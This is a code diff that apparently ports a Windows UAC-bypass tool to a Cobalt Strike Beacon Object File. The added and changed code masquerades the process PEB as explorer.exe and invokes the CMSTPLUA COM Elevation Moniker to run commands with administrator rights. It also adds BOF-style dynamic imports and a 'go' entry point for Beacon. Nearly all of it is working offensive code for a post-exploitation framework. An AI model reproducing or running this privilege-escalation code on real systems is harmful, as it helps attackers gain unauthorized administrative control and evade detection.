@@ -1,4 +1,20 @@
 /**
+ * This is a Cobalt Strike (CS) Beacon Object File (BOF) 
+ * which exploits the CMSTPLUA COM interface. It masquerade 
+ * the PEB of the current process to a Windows process, and 
+ * then utilises COM Elevation Moniker on the CMSTPLUA COM 
+ * object in order to execute commands in an elevated 
+ * context.
+ * 
+ * Author:
+ *  - Tijme Gommers (github.com/tijme, twitter.com/tijme)
+ * 
+ * Credits:
+ *  - Alex (github.com/lldre)
+ *    Thanks for teaching me all of this Alex!
+ */
+
+ /**
  * Standard Input Output.
  * 
  * Defines three variable types, several macros, and various functions for performing input and output.
@@ -50,7 +66,6 @@
  * Windows API.
  * 
  * Contains declarations for all of the functions, macro's & data types in the Windows API.
- * Define 'WIN32_LEAN_AND_MEAN' to make sure windows.h compiles without warnings.
  * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
  */
 #include <windows.h>
@@ -110,6 +125,12 @@
  */
 #define COBJMACROS
 #include <wuapi.h>
+
+/**
+ * Load custom header files.
+ */
+#include "headers/imports.h"
+#include "headers/beacon.h"
 
 /**
  * Dynamically include Windows libraries
@@ -263,38 +284,38 @@ int masqueradePEB() {
 
     puts("[+] \t- Getting 'explorer.exe' path.");
     WCHAR chExplorerPath[MAX_PATH];
-    GetWindowsDirectoryW(chExplorerPath, MAX_PATH);
-    wcscat_s(chExplorerPath, sizeof(chExplorerPath) / sizeof(wchar_t), L"\\explorer.exe");
+    KERNEL32$GetWindowsDirectoryW(chExplorerPath, MAX_PATH);
+    MSVCRT$wcscat_s(chExplorerPath, sizeof(chExplorerPath) / sizeof(wchar_t), L"\\explorer.exe");
     LPWSTR pwExplorerPath = (LPWSTR) malloc(MAX_PATH);
-    wcscpy_s(pwExplorerPath, MAX_PATH, chExplorerPath);
+    MSVCRT$wcscpy_s(pwExplorerPath, MAX_PATH, chExplorerPath);
 
     puts("[+] \t- Getting current PEB.");
     PEB* peb = (PEB*) NtGetPeb();
 
-    RtlEnterCriticalSection(peb->FastPebLock);
+    NTOSKRNL$RtlEnterCriticalSection(peb->FastPebLock);
 
     puts("[+] \t- Masquerading ImagePathName and CommandLine.");
-    RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, chExplorerPath);
-    RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, chExplorerPath);
+    NTOSKRNL$RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, chExplorerPath);
+    NTOSKRNL$RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, chExplorerPath);
 
     PLDR_DATA_TABLE_ENTRY pStartModuleInfo = (PLDR_DATA_TABLE_ENTRY) peb->Ldr->InLoadOrderModuleList.Flink;
     PLDR_DATA_TABLE_ENTRY pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) peb->Ldr->InLoadOrderModuleList.Flink;
 
     WCHAR wExeFileName[MAX_PATH];
-    GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);
+    KERNEL32$GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);
 
     do {
         if (_wcsicmp(wExeFileName, pNextModuleInfo->FullDllName.Buffer) == 0) {
             puts("[+] \t- Masquerading FullDllName and BaseDllName.");
-            RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
-            RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
+            NTOSKRNL$RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
+            NTOSKRNL$RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
             break;
         }
 
         pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) pNextModuleInfo->InLoadOrderLinks.Flink;
     } while (pNextModuleInfo != pStartModuleInfo);
 
-    RtlLeaveCriticalSection(peb->FastPebLock);
+    NTOSKRNL$RtlLeaveCriticalSection(peb->FastPebLock);
     return 0;
 }
 
@@ -307,7 +328,7 @@ int masqueradePEB() {
 char* StringFromResult(HRESULT result) {
     char* message = calloc(100, sizeof(char));
 
-    if (FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, result, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), message, 100, NULL) == 0) {
+    if (KERNEL32$FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, result, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), message, 100, NULL) == 0) {
         message = "UNKNOWN";
         return message;
     }
@@ -327,19 +348,19 @@ int invokeComElevation() {
     do {
         puts("[+] \t- IIDFromString.");
         IID hIID_ICMLuaUtil;
-        if (IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &hIID_ICMLuaUtil) != S_OK) {
+        if (OLE32$IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &hIID_ICMLuaUtil) != S_OK) {
             puts("[!] Could not get IID from ICMLuaUtil GUID.");
             break;
         }
 
         puts("[+] \t- Initializing BIND_OPTS3.");
         BIND_OPTS3 hBindOpts;
-        RtlSecureZeroMemory(&hBindOpts, sizeof(hBindOpts));
+        NTOSKRNL$RtlSecureZeroMemory(&hBindOpts, sizeof(hBindOpts));
         hBindOpts.cbStruct = sizeof(hBindOpts);
         hBindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
 
         puts("[+] \t- CoInitialize.");
-        CoInitialize(NULL);
+        OLE32$CoInitialize(NULL);
 
         puts("[+] \t- CoGetObject.");
         hResult = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS*) &hBindOpts, &hIID_ICMLuaUtil, &pICMLuaUtil);
@@ -400,6 +421,18 @@ int boot() {
  */
 __declspec(dllexport) bool WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     return boot() == 0;
+}
+
+/**
+ * CS BOF entry point.
+ * 
+ * The Cobalt Strike (CS) Beacon Object File (BOF) entry point.
+ * 
+ * @param char* args The array of arguments.
+ * @param int length The length of the array of arguments.
+ */
+void go(char* args, int length) {
+    boot();
 }
 
 /**
